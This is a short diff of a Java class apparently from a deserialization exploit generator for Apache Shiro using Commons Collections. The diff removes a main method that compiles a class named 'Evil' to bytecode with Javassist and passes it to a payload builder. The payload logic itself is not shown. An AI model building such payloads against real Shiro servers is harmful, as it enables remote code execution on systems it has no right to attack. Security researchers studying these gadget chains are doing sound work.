@@ -49,12 +49,4 @@ public class CommonsCollectionsShiro {
 
         return barr.toByteArray();
     }
-
-    public static void main(String []args) throws Exception {
-        ClassPool pool = ClassPool.getDefault();
-        CtClass clazz = pool.get(Evil.class.getName());
-
-        System.out.println("Class " + Evil.class.getName() + "'s bytecode is generate.");
-        new CommonsCollectionsShiro().getPayload(clazz.toBytecode());
-    }
 }
